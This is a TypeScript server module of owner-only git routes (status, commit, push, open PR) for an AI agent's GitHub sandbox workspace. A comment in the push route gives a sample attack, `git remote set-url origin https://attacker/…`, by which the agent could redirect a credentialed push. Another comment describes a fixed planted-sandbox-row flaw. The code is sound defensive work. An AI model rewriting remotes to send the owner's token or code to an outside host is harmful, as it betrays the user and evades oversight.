/**
 * Git actions for a conversation's GitHub workspace — status, commit, push,
 * open a pull request — run from the Inspector rather than left to the
 * model. The agent is told to commit as it goes but never to push or open a
 * PR (see agent/workspace.ts's describeWorkspace): those are the user's own
 * actions, taken here.
 *
 * Owner-only throughout, matching the sandbox terminal and REST routes:
 * pushing to the user's own GitHub as them, and the token that requires, is
 * not something a shared editor should be able to trigger.
 */
import type { FastifyInstance } from "fastify";
import { and, db, desc, eq, ne } from "@loxaic/db";
import { sandboxes } from "@loxaic/db/schema";
import { authenticate } from "../auth/middleware";
import { hasRole } from "../streams/authz";
import { getRunByConversation } from "../streams/registry.ts";
import { loadWorkspace, setWorkspacePr } from "../agent/workspace.ts";
import { attachRunningSandbox } from "../agent/sandbox-manager.ts";
import { getConnection, getOwnerToken } from "../github/connection.ts";
import { createPull, GithubApiError, GithubPullExistsError } from "../github/client.ts";
import { gitCredentialArgs, gitEnv } from "../sandbox/git.ts";
import type { Workspace } from "@loxaic/types";

/** Every route needs the same four things: the workspace (and its owner), the
 * repo it names, whether a run is using it right now, and — for anything past
 * a read — the sandbox that actually holds the checkout. Resolved once so
 * each route only states what's different about it. */
async function loadContext(
  conversationId: string,
): Promise<
  | { ok: false; status: number; error: string }
  | { ok: true; ownerId: string; workspace: Workspace & { kind: "github" } }
> {
  const loaded = await loadWorkspace(conversationId);
  if (!loaded) return { ok: false, status: 404, error: "Not found" };
  if (loaded.workspace.kind !== "github") {
    return { ok: false, status: 400, error: "This conversation has no GitHub workspace" };
  }
  return { ok: true, ownerId: loaded.ownerId, workspace: loaded.workspace };
}

/** The conversation's live sandbox row, or null if the agent has never run a
 * tool in it. Never creates one — a git action is not a reason to clone a
 * repository nobody has touched yet, and `GET status` in particular must not
 * have that side effect just because the Inspector was opened. */
async function findSandboxRow(conversationId: string, ownerId: string) {
  // Scoped to the owner's rows, not just the conversation's. Every action
  // here runs in whatever sandbox this returns — Push with the owner's PAT
  // in its environment — so a row that merely *names* the conversation must
  // not be enough: POST /v1/sandboxes stored its conversation_id unchecked,
  // and the newest-first order made a planted row win. (That route now
  // requires owner role too; this predicate is the second lock.)
  return db.query.sandboxes.findFirst({
    where: and(
      eq(sandboxes.conversationId, conversationId),
      eq(sandboxes.ownerId, ownerId),
      ne(sandboxes.status, "destroyed"),
    ),
    orderBy: desc(sandboxes.createdAt),
  });
}

/** `git status --porcelain=v1` lines into `{path, status}`. Deliberately not
 * v2: v1's two-column code is enough for what the panel shows, and v2's
 * richer (and stranger — renames carry two paths) format buys nothing here. */
function parseStatus(porcelain: string): { path: string; status: string }[] {
  return porcelain
    .split("\n")
    .filter(Boolean)
    .map((line) => {
      const code = line.slice(0, 2);
      const path = line.slice(3);
      const status =
        code === "??" ? "untracked" :
        code.includes("A") ? "added" :
        code.includes("D") ? "deleted" :
        code.includes("R") ? "renamed" :
        code.includes("M") ? "modified" : "changed";
      return { path, status };
    });
}

function runningError(): { status: 409; error: string } {
  return { status: 409, error: "The agent is still working — try again once this run finishes." };
}

export function gitRoutes(app: FastifyInstance) {
  app.get<{ Params: { id: string } }>("/v1/conversations/:id/git/status", async (request, reply) => {
    const userId = await authenticate(request, reply);
    if (!(await hasRole(userId, request.params.id, "owner"))) {
      reply.code(404);
      return { error: "Not found" };
    }
    const ctx = await loadContext(request.params.id);
    if (!ctx.ok) {
      reply.code(ctx.status);
      return { error: ctx.error };
    }

    const row = await findSandboxRow(request.params.id, ctx.ownerId);
    if (!row) {
      // Nothing cloned yet — a fact, not an error. The panel shows the branch
      // names the workspace already committed to and nothing else.
      return {
        cloned: false,
        repo: ctx.workspace.repo,
        branch: ctx.workspace.branch,
        baseBranch: ctx.workspace.baseBranch,
        pr: ctx.workspace.pr ?? null,
      };
    }
    const handle = await attachRunningSandbox(row);
    if (!handle) {
      return {
        cloned: false,
        repo: ctx.workspace.repo,
        branch: ctx.workspace.branch,
        baseBranch: ctx.workspace.baseBranch,
        pr: ctx.workspace.pr ?? null,
      };
    }

    const [changedResult, aheadBehind] = await Promise.all([
      handle.exec(["git", "status", "--porcelain=v1"], { workdir: handle.workdir }),
      handle.exec(
        ["git", "rev-list", "--left-right", "--count", `origin/${ctx.workspace.baseBranch}...HEAD`],
        { workdir: handle.workdir },
      ),
    ]);
    // Both exit codes matter, differently. A failed `git status` means the
    // checkout is broken (half a clone, not a repo), and used to come back as
    // a confident `changed: []` with Commit greyed out — "everything is
    // committed" for a workspace that had nothing. A failed rev-list is
    // ordinary (the base ref was never fetched) and is reported as unknown,
    // never as 0 ahead — which disabled Push on the strength of nothing.
    if (changedResult.exitCode !== 0) {
      reply.code(500);
      return { error: `git status failed: ${changedResult.stderr.trim() || "not a git repository"}` };
    }
    const counts = aheadBehind.exitCode === 0 ? aheadBehind.stdout.trim().split(/\s+/) : null;
    const behind = counts && counts[0] !== undefined && /^\d+$/.test(counts[0]) ? Number(counts[0]) : null;
    const ahead = counts && counts[1] !== undefined && /^\d+$/.test(counts[1]) ? Number(counts[1]) : null;
    return {
      cloned: true,
      repo: ctx.workspace.repo,
      branch: ctx.workspace.branch,
      baseBranch: ctx.workspace.baseBranch,
      pr: ctx.workspace.pr ?? null,
      changed: parseStatus(changedResult.stdout),
      ahead,
      behind,
    };
  });

  app.post<{ Params: { id: string } }>("/v1/conversations/:id/git/commit", async (request, reply) => {
    const userId = await authenticate(request, reply);
    if (!(await hasRole(userId, request.params.id, "owner"))) {
      reply.code(404);
      return { error: "Not found" };
    }
    if (getRunByConversation(request.params.id)) {
      const err = runningError();
      reply.code(err.status);
      return { error: err.error };
    }
    const ctx = await loadContext(request.params.id);
    if (!ctx.ok) {
      reply.code(ctx.status);
      return { error: ctx.error };
    }
    const { message } = (request.body ?? {}) as { message?: unknown };
    if (typeof message !== "string" || message.trim().length === 0) {
      reply.code(400);
      return { error: "message must be a non-empty string" };
    }

    const row = await findSandboxRow(request.params.id, ctx.ownerId);
    const handle = row ? await attachRunningSandbox(row) : null;
    if (!handle) {
      reply.code(400);
      return { error: "The agent hasn't started working in this repository yet — send a message first" };
    }

    // Identity passed at commit time, from the connection as it stands now,
    // rather than trusting the config written at clone time: a connection
    // added or changed after the clone must still be able to commit.
    const connection = await getConnection(ctx.ownerId);
    if (!connection) {
      reply.code(400);
      return { error: "GitHub is not connected" };
    }
    const name = connection.name ?? connection.login;
    const email = connection.email ?? `${connection.login}@users.noreply.github.com`;

    const add = await handle.exec(["git", "add", "-A"], { workdir: handle.workdir });
    if (add.exitCode !== 0) {
      reply.code(500);
      return { error: `git add failed: ${add.stderr.trim()}` };
    }
    const commit = await handle.exec(
      ["git", "-c", `user.name=${name}`, "-c", `user.email=${email}`, "commit", "-m", message],
      { workdir: handle.workdir },
    );
    if (commit.exitCode !== 0) {
      reply.code(400);
      return { error: commit.stdout.includes("nothing to commit") ? "Nothing to commit" : commit.stderr.trim() || commit.stdout.trim() };
    }
    return { ok: true };
  });

  app.post<{ Params: { id: string } }>("/v1/conversations/:id/git/push", async (request, reply) => {
    const userId = await authenticate(request, reply);
    if (!(await hasRole(userId, request.params.id, "owner"))) {
      reply.code(404);
      return { error: "Not found" };
    }
    if (getRunByConversation(request.params.id)) {
      const err = runningError();
      reply.code(err.status);
      return { error: err.error };
    }
    const ctx = await loadContext(request.params.id);
    if (!ctx.ok) {
      reply.code(ctx.status);
      return { error: ctx.error };
    }
    const row = await findSandboxRow(request.params.id, ctx.ownerId);
    const handle = row ? await attachRunningSandbox(row) : null;
    if (!handle) {
      reply.code(400);
      return { error: "The agent hasn't started working in this repository yet — send a message first" };
    }
    const token = await getOwnerToken(ctx.ownerId);
    if (!token) {
      reply.code(400);
      return { error: "GitHub is not connected" };
    }

    // `origin` is read from a `.git/config` the model writes to freely, and
    // `git remote set-url origin https://attacker/…` is one bash tool call.
    // The push goes to the URL the workspace was created with, or nowhere:
    // checked here against the server's own record before anything
    // credentialed runs. (The credential helper is also scoped to that URL's
    // host — sandbox/git.ts — so this is the first of two locks.)
    const remote = await handle.exec(["git", "remote", "get-url", "origin"], { workdir: handle.workdir });
    if (remote.exitCode !== 0 || remote.stdout.trim() !== ctx.workspace.cloneUrl) {
      reply.code(409);
      return {
        error:
          "The checkout's origin no longer matches the repository this workspace was created from — " +
          "refusing to push. Restore it with `git remote set-url origin " + ctx.workspace.cloneUrl + "` first.",
      };
    }
    const push = await handle.exec(
      ["git", ...gitCredentialArgs(), "push", "-u", "origin", ctx.workspace.branch],
      { workdir: handle.workdir, env: gitEnv(token, ctx.workspace.cloneUrl) },
    );
    if (push.exitCode !== 0) {
      reply.code(400);
      return { error: redact(push.stderr.trim() || "push failed", token) };
    }
    return { ok: true };
  });

  app.post<{ Params: { id: string } }>("/v1/conversations/:id/git/pr", async (request, reply) => {
    const userId = await authenticate(request, reply);
    if (!(await hasRole(userId, request.params.id, "owner"))) {
      reply.code(404);
      return { error: "Not found" };
    }
    if (getRunByConversation(request.params.id)) {
      const err = runningError();
      reply.code(err.status);
      return { error: err.error };
    }
    const ctx = await loadContext(request.params.id);
    if (!ctx.ok) {
      reply.code(ctx.status);
      return { error: ctx.error };
    }
    // Idempotent by our own memory: once a PR is recorded for this workspace,
    // every later call just returns it rather than asking GitHub again.
    if (ctx.workspace.pr) return ctx.workspace.pr;

    const { title, body } = (request.body ?? {}) as { title?: unknown; body?: unknown };
    if (typeof title !== "string" || title.trim().length === 0) {
      reply.code(400);
      return { error: "title must be a non-empty string" };
    }
    const token = await getOwnerToken(ctx.ownerId);
    if (!token) {
      reply.code(400);
      return { error: "GitHub is not connected" };
    }
    const [owner, name] = ctx.workspace.repo.split("/");
    try {
      const pull = await createPull(token, owner, name, {
        head: ctx.workspace.branch,
        base: ctx.workspace.baseBranch,
        title,
        ...(typeof body === "string" && body.length > 0 ? { body } : {}),
      });
      const pr = { number: pull.number, url: pull.html_url };
      await setWorkspacePr(request.params.id, pr);
      return pr;
    } catch (err) {
      if (err instanceof GithubPullExistsError) {
        reply.code(409);
        return { error: "A pull request for this branch already exists on GitHub, but Loxaic lost track of it." };
      }
      // Every other 422 — "No commits between main and …" being the common
      // one, since nothing gates Open PR on having pushed — reaches the user
      // as GitHub's own words, which say what to do.
      if (err instanceof GithubApiError) {
        reply.code(400);
        return { error: err.message };
      }
      throw err;
    }
  });
}

/** Local redaction — this route never imports the sandbox handle's owning
 * provider's own redact(), which is a module-private helper in sandbox/git.ts. */
function redact(text: string, token: string): string {
  return token.length >= 4 ? text.split(token).join("[redacted]") : text;
}

